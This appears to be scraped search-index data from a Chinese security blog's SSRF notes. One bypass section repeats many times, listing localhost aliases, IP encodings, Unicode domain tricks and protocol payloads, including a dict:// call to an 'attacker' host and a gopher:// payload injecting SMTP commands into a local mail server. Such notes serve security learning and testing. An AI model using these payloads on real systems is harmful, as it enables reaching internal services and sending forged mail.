ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#6利用dns解析"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#7利用上传"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#8利用enclosed-alphanumerics"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#9利用句号"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#10利用进制转换"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#11利用特殊地址"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#12利用协议"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ 